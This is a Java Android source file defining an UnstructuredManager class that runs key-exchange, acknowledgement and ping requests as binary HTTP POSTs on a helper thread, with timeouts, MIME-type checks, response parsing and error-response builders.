package com.vvt.phoenix.prot.unstruct;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Arrays;

import android.os.ConditionVariable;
import android.os.Looper;

import com.vvt.http.Http;
import com.vvt.http.HttpListener;
import com.vvt.http.request.HttpRequest;
import com.vvt.http.request.MethodType;
import com.vvt.http.response.HttpResponse;
import com.vvt.logger.FxLog;
import com.vvt.phoenix.exception.DataCorruptedException;
import com.vvt.phoenix.prot.parser.UnstructProtParser;

/**
 * @author tanakharn
 * @version 1.0
 * @updated 20-Oct-2010 10:59:40 AM
 */
public class UnstructuredManager{
	
	//Debugging
	private static final String TAG = "UnstructuredManager";	
	//Constants
	private static final int HTTP_TIME_OUT = (3*60*1000);	// 3 minutes
	private static final int THREAD_TIME_OUT = (4*60*1000);	// 4 minutes
	
	//Members
	private Http mHttp;
	private String mUrl;
	private byte[] mRequestData;
	private ByteArrayOutputStream mHttpResponse;
	private ConditionVariable mLock;
	private boolean mHttpOpearationIsSuccess;
	private String mHttpErrorMsg;
	
	
	public UnstructuredManager(String unstructuredUrl){
		mLock = new ConditionVariable();
		mHttp = new Http();
		mUrl = unstructuredUrl;
	}
	
	/**
	 * 
	 * @param code
	 * @param encodingType
	 */
	public KeyExchangeResponse doKeyExchange(int code, int encodingType){
		
		//1 parse request
		mRequestData = UnstructProtParser.parseKeyExchangeRequest(code, encodingType);
				
		//2 call HttpCaller
		HttpCaller httpCaller = new HttpCaller();
		httpCaller.setPriority(Thread.MIN_PRIORITY);
		httpCaller.start();
		
		//3 wait for HTTP operation to finished
		FxLog.w(TAG, "> doKeyExchange # Waiting for HTTP operation to finished");
		//if(mLock.block(1) == false){	// for test Thread time out
		if(mLock.block(THREAD_TIME_OUT) == false){	//time out
			mLock.close();
			FxLog.e(TAG, "> doKeyExchange # Opeartion Time out");
			return createKeyExchangeErrorResponse("KeyExchange Error: Operation Time Out");
		}
		FxLog.v(TAG, "> doKeyExchange # Http operation is done");
		mLock.close();
		// check HTTP status
		if(!mHttpOpearationIsSuccess){
			return createKeyExchangeErrorResponse(String.format("KeyExchange Error: %s", mHttpErrorMsg));
		}
		
		//4 parse response
		KeyExchangeResponse response = null;
		FxLog.v(TAG, "> doKeyExchange # Parsing response data");
		try {
			response = UnstructProtParser.parseKeyExchangeResponse(mHttpResponse.toByteArray());
			response.setResponseFlag(true);
			closeByteArrayOutputStream();
			// for testing parsing response error
			/*if(true){
				throw new DataCorruptedException("Dummy");
			}*/
		} catch (DataCorruptedException e) {
			String msg = String.format("> doKeyExchange # Data corrupted while parsing key exchnage response : \n%s", e.getMessage());
			FxLog.e(TAG, msg);
			return createKeyExchangeErrorResponse(msg);
		}
		
		FxLog.v(TAG, String.format("> doKeyExchange # Server give us SSID: %d", response.getSessionId()));
		FxLog.v(TAG, "> doKeyExchange # Return result");
		
		return response;
	}

	
	/**
	 * @param code now set to 1 only
	 * @param sessionId
	 * @return
	 */
	public AckSecResponse doAckSecure(int code, long sessionId){
		FxLog.d(TAG, String.format("> AckSecResponse # Code %d, SSID %d", code, sessionId));
		
		//1 parse request
		mRequestData = UnstructProtParser.parseAckSecureRequest(code, sessionId);
		
		//2 call HttpCaller
		HttpCaller httpCaller = new HttpCaller();
		httpCaller.setPriority(Thread.MIN_PRIORITY);
		httpCaller.start();
		
		//3 wait for HTTP operation
		FxLog.w(TAG, "> doAckSecure # Waiting for HTTP operation to finished");
		if(mLock.block(THREAD_TIME_OUT) == false){	//time out
		//if(mLock.block(1) == false){	// for test Thread time out
			mLock.close();
			FxLog.e(TAG, "> doAckSecure # Opeartion Time out");
			return createAckSecureErrorResponse("Acknowledge Secure Error: Operation Time Out");
		}
		FxLog.v(TAG, "> doAckSecure # Http operation is done");
		mLock.close();
		// check HTTP status
		if(!mHttpOpearationIsSuccess){
			return createAckSecureErrorResponse(String.format("Acknowledge Secure Error: %s", mHttpErrorMsg));
		}
		
		//4 parse response
		AckSecResponse response = null;
		FxLog.v(TAG, "> doAckSecure # Parsing response data");
		try {
			response = UnstructProtParser.parseAckSecureResponse(mHttpResponse.toByteArray());
			response.setResponseFlag(true);	
			closeByteArrayOutputStream();
			// for testing parsing response error
			/*if(true){
				throw new DataCorruptedException("Dummy");
			}*/
		} catch (DataCorruptedException e) {
			String msg = String.format("> doAckSecure # Data corrupted while parsing Acknowledge Secure response : \n%s", e.getMessage());
			FxLog.e(TAG, msg);
			return createAckSecureErrorResponse(msg);
		}
		
		FxLog.v(TAG, "> doAckSecure # Return result");
		
		return response;
	}
	
	/**
	 * @param code now set to 1 only
	 * @param sessionId
	 * @param deviceId
	 * @return
	 */
	public AckResponse doAck(int code, long sessionId, String deviceId){
		
		//1 parse request
		mRequestData = UnstructProtParser.parseAckRequest(code, sessionId, deviceId);
		
		//2 call HttpCaller
		HttpCaller httpCaller = new HttpCaller();
		httpCaller.setPriority(Thread.MIN_PRIORITY);
		httpCaller.start();
		
		//3 wait for HTTP operation
		FxLog.w(TAG, "> doAck # Waiting for HTTP operation to finished");
		if(mLock.block(THREAD_TIME_OUT) == false){	//time out
		//if(mLock.block(1) == false){	// for test Thread time out
			mLock.close();
			FxLog.e(TAG, "> doAck # Opeartion Time out");
			return createAckErrorResponse("Acknowledge Error: Operation Time Out");
		}
		FxLog.v(TAG, "> doAck # Http operation is done");
		mLock.close();
		// check HTTP status
		if(!mHttpOpearationIsSuccess){
			return createAckErrorResponse(String.format("Acknowledge Error: %s", mHttpErrorMsg));
		}
		
		//4 parse response
		AckResponse response = null;
		FxLog.v(TAG, "> doAck # Parsing response data");
		try {
			response = UnstructProtParser.parseAckResponse(mHttpResponse.toByteArray());
			response.setResponseFlag(true);	
			closeByteArrayOutputStream();
			// for testing parsing response error
			/*if(true){
				throw new DataCorruptedException("Dummy");
			}*/
		} catch (DataCorruptedException e) {
			String msg = String.format("> doAck # Data corrupted while parsing Acknowledge response : \n%s", e.getMessage());
			FxLog.e(TAG, msg);
			return createAckErrorResponse(msg);
		}
		
		FxLog.v(TAG, "> doAck # Return result");
		
		return response;
		
		/*//1 parse request
		mRequestData = UnstructProtParser.parseAckRequest(code, sessionId, deviceId);
		
		//2 call Secretary to work with Http
		mHttpResponseBuffer = new DataBuffer();
		Secretary s = new Secretary();
		s.start();
		
		//3 wait for Secretary response
		if(DEBUG){
			Log.v(TAG, "Blocking thread and waiting for Secretary response...");
		}
		// if time out
		if(mLock.block(THREAD_TIME_OUT) == false){	//time out
			mLock.close();
			if(DEBUG){
				Log.e(TAG, "Operation time out");
			}
			return createAckErrorResponse("Operation Time Out");
		}
		mLock.close();
		// if finished, check http status
		if(mHttpError == true){
			return createAckErrorResponse(mHttpErrorMsg);
		}
		
		//4 parse response
		AckResponse response = null;
		try {
			response = UnstructProtParser.parseAckResponse(mHttpResponseBuffer.toArray());
		} catch (DataCorruptedException e) {
			return createAckErrorResponse(e.getMessage());
		}
		
		response.setResponseFlag(true);		
		return response;*/
	}
	
	public PingResponse doPing(int code){
		
		//1 parse request
		mRequestData = UnstructProtParser.parsePingRequet(code);
		
		//2 call HttpCaller
		HttpCaller httpCaller = new HttpCaller();
		httpCaller.setPriority(Thread.MIN_PRIORITY);
		httpCaller.start();
		
		//3 wait for HTTP operation
		FxLog.w(TAG, "> doPing # Waiting for HTTP operation to finished");
		if(mLock.block(THREAD_TIME_OUT) == false){	//time out
		//if(mLock.block(1) == false){	// for test Thread time out
			mLock.close();
			FxLog.e(TAG, "> doPing # Opeartion Time out");
			return createPingErrorResponse("Ping Error: Operation Time Out");
		}
		FxLog.v(TAG, "> doPing # Http operation is done");
		mLock.close();
		// check HTTP status
		if(!mHttpOpearationIsSuccess){
			return createPingErrorResponse(String.format("Ping Error: %s", mHttpErrorMsg));
		}
			
		//4 parse response
		PingResponse response = null;
		FxLog.v(TAG, "> doPing # Parsing response data");
		try {
			response = UnstructProtParser.parsePingResponse(mHttpResponse.toByteArray());
			response.setResponseFlag(true);	
			closeByteArrayOutputStream();
			// for testing parsing response error
			/*if(true){
				throw new DataCorruptedException("Dummy");
			}*/
		} catch (DataCorruptedException e) {
			String msg = String.format("> doPing # Data corrupted while parsing Ping response : \n%s", e.getMessage());
			FxLog.e(TAG, msg);
			return createPingErrorResponse(msg);
		}
		
		FxLog.v(TAG, "> doPing # Return result");
		
		return response;
	}
	
	
	/**
	 * use for return error response in many case
	 * @param msg
	 * @return
	 */
	private KeyExchangeResponse createKeyExchangeErrorResponse(String msg){
		FxLog.d(TAG, String.format("> createKeyExchangeErrorResponse # Error Message: %s", msg));
		KeyExchangeResponse response = new KeyExchangeResponse();
		response.setErrorMessage(msg);
		response.setResponseFlag(false);
		
		return response;
	}
	
	private AckSecResponse createAckSecureErrorResponse(String msg){
		FxLog.d(TAG, String.format("> createAckSecureErrorResponse # Error Message: %s", msg));
		AckSecResponse response = new AckSecResponse();
		response.setErrorMessage(msg);
		response.setResponseFlag(false);
		
		return response;
	}
	
	private AckResponse createAckErrorResponse(String msg){
		AckResponse response = new AckResponse();
		response.setErrorMessage(msg);
		response.setResponseFlag(false);
		
		return response;
	}
	
	private PingResponse createPingErrorResponse(String msg){
		PingResponse response = new PingResponse();
		response.setErrorMessage(msg);
		response.setResponseFlag(false);

		return response;
	}
	
	// **************************************** HTTP Caller Thread ******************************************** //
	private class HttpCaller extends Thread implements HttpListener{
		
		@Override
		public void run(){
			Looper.prepare();
			
			HttpRequest request = new HttpRequest();
	        request.addDataItem(mRequestData);
			request.setConnectionTimeOut(HTTP_TIME_OUT);
			request.setContentType(com.vvt.http.request.ContentType.BINARY_OCTET_STREAM);
			request.setMethodType(MethodType.POST);
			request.setUrl(mUrl);
			mHttpResponse = new ByteArrayOutputStream();
			mHttp.execute(request, this);
			
			FxLog.v(TAG, "> HttpCaller > run # HttpCaller started");
			Looper.loop();
		}

		@Override
		public void onHttpConnectError(Exception e) {
			
			mHttpOpearationIsSuccess = false;
			mHttpErrorMsg = e.getMessage();
			FxLog.e(TAG, String.format("> HttpCaller > onHttpConnectError # %s", mHttpErrorMsg));
			
			mLock.open();
			
			Looper.myLooper().quit();
		}

		@Override
		public void onHttpTransportError(Exception e) {
			
			mHttpOpearationIsSuccess = false;
			mHttpErrorMsg = e.getMessage();
			FxLog.e(TAG, String.format("> HttpCaller > onHttpTransportError # %s", mHttpErrorMsg));
			
			mLock.open();
			
			Looper.myLooper().quit();
		}

		@Override
		public void onHttpError(int httpStatusCode, Exception e) {
			
			mHttpOpearationIsSuccess = false;
			mHttpErrorMsg = String.format("HTTP Code %d, Error Message: %s", httpStatusCode, e.getMessage());
			FxLog.e(TAG, String.format("> HttpCaller > onHttpError # %s", mHttpErrorMsg));
			
			mLock.open();
			
			Looper.myLooper().quit();
		}

		@Override
		public void onHttpSentProgress(com.vvt.http.response.SentProgress progress) {
			FxLog.v(TAG, String.format("> HttpCaller > onHttpSentProgress # sending %d bytes of %d bytes", progress.getSentSize(), progress.getTotalSize()));
			
		}

		@Override
		public void onHttpResponse(HttpResponse response) {
			FxLog.v(TAG, String.format("> HttpCaller > onHttpResponse # HTTP Code %d, Body %s", response.getResponseCode(), Arrays.toString(response.getBody())));
			
			//1 check MIME type
			com.vvt.http.request.ContentType requestMimeType = response.getHttpRequest().getContentType();
			com.vvt.http.request.ContentType responseMimeType = response.getResponseContentType();
			//for test
			//responseMimeType = ContentType.FORM_POST;	
			if(requestMimeType != responseMimeType){
				FxLog.w(TAG, "> HttpCaller > onHttpResponse # Response MIME type doesn't matched with the request");
				mHttpOpearationIsSuccess = false;
				mHttpErrorMsg = "Response MIME type doesn't matched with the request";
				mLock.open();
				Looper.myLooper().quit();
				return;
			}
			
			//2 buffer response
			byte[] responseBody = response.getBody();
			mHttpResponse.write(responseBody, 0, responseBody.length);
		}

		@Override
		public void onHttpSuccess(HttpResponse response) {
			FxLog.v(TAG, "> HttpCaller > onHttpSuccess");

			mHttpOpearationIsSuccess = true;
			mLock.open();
			Looper.myLooper().quit();
		}
		
	}
	
	// ************************************** Resources Util *************************************** //
		
	private void closeByteArrayOutputStream(){
		try {
			mHttpResponse.close();
		} catch (IOException e) {
			FxLog.e(TAG, String.format("> closeByteArrayOutputStream # Got IOException while closing ByteArrayOutputStream: %s", e.getMessage()));
		}
	}
			
}